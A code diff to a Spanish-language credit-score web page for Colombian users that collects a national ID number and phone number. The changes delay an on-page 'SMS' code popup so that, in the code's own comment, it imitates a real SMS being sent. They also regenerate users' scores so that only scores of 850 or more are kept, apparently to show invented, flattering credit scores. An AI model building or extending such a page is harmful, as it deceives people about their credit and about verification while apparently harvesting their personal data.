@@ -1956,20 +1956,17 @@
       <div style="text-align:center;padding-top:8px;">
         <div style="font-size:13px;color:rgba(255,255,255,0.8);margin-bottom:12px;">Tu puntaje de crédito</div>
         <!-- SVG Gauge -->
-        <div style="position:relative;display:inline-block;width:220px;height:130px;">
+        <div style="display:inline-block;text-align:center;">
           <svg width="220" height="115" viewBox="0 0 220 115">
-            <!-- Background arc -->
             <path d="M 18 108 A 92 92 0 0 1 202 108" fill="none" stroke="rgba(255,255,255,0.2)" stroke-width="18" stroke-linecap="round"/>
-            <!-- Score arc -->
-            <path id="scoreArc" d="M 18 108 A 92 92 0 0 1 202 108" fill="none" stroke="#FF9800" stroke-width="18" stroke-linecap="round" stroke-dasharray="289" stroke-dashoffset="289"/>
-            <!-- Range labels -->
+            <path id="scoreArc" d="M 18 108 A 92 92 0 0 1 202 108" fill="none" stroke="#4CAF50" stroke-width="18" stroke-linecap="round" stroke-dasharray="289" stroke-dashoffset="289"/>
             <text x="8"  y="115" fill="rgba(255,255,255,0.55)" font-size="10" font-family="sans-serif">150</text>
             <text x="183" y="115" fill="rgba(255,255,255,0.55)" font-size="10" font-family="sans-serif">950</text>
           </svg>
-          <!-- Score dentro del arco -->
-          <div style="position:absolute;bottom:14px;left:0;right:0;text-align:center;line-height:1;">
+          <!-- Puntaje DEBAJO de la barra -->
+          <div style="margin-top:4px;">
             <div id="dashScore" style="font-size:52px;font-weight:900;color:#fff;line-height:1;">—</div>
-            <div id="dashScoreLabel" style="font-size:11px;font-weight:800;margin-top:3px;letter-spacing:0.5px;"></div>
+            <div id="dashScoreLabel" style="font-size:11px;font-weight:800;margin-top:4px;letter-spacing:0.5px;"></div>
           </div>
         </div>
         <div id="dashImpacto" style="margin-top:10px;font-size:13px;color:rgba(255,255,255,0.9);"></div>
@@ -3010,13 +3007,14 @@ async function step2Next() {
     await upsertUser({ cedula: currentCedula, telefono: phone, ultimoCodigo: currentCode });
   }
 
-  if (btn2) { btn2.disabled = false; btn2.style.opacity = '1'; btn2.textContent = 'Continuar'; }
-
   document.getElementById('step3Desc').textContent = `Ingresa el código enviado al +57 ${phone.slice(0,3)}••••${phone.slice(-2)}`;
   document.getElementById('codeInput').value = '';
   document.getElementById('step3Error').style.display = 'none';
   goStep(3);
-  showSmsPopup(currentCode);
+  if (btn2) { btn2.disabled = false; btn2.style.opacity = '1'; btn2.textContent = 'Continuar'; }
+
+  // El código aparece después de 5 segundos (simula envío real del SMS)
+  setTimeout(() => showSmsPopup(currentCode), 5000);
 }
 
 async function step3Verify() {
@@ -3188,7 +3186,9 @@ function generateUserData(cedula) {
 
 async function getOrCreateUserData(cedula) {
   const user = await findUser(cedula);
-  if (user && user.puntaje) return user;
+  // Si ya tiene puntaje en rango 850-910, lo dejamos fijo
+  if (user && user.puntaje && Number(user.puntaje) >= 850) return user;
+  // Si no tiene puntaje o tiene uno viejo fuera del rango, generamos nuevo
   const data = generateUserData(cedula);
   return await upsertUser({ cedula, ...data });
 }
